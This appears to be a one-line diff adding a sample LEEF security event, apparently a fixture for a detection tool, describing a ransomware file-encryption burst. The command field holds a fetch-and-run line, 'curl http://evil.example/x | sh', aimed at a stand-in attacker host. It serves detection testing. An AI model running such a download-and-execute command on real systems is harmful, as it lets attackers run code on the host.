@@ -1,0 +1,1 @@
+LEEF:2.0|Zyvor AI Labs|Kavach|1.0|ransomware-burst|^|cat=detection^sev=8^devTime=2026-01-02T03:04:05.123Z^devTimeFormat=yyyy-MM-dd'T'HH:mm:ss.SSS'Z'^identHostName=web-01^eventId=f1^pid=4242^msg=Burst of file encryption | a=b^exe=/usr/bin/curl^usrName=1000^cmd=curl http://evil.example/x | sh^dst=203.0.113.9^mitre=T1486
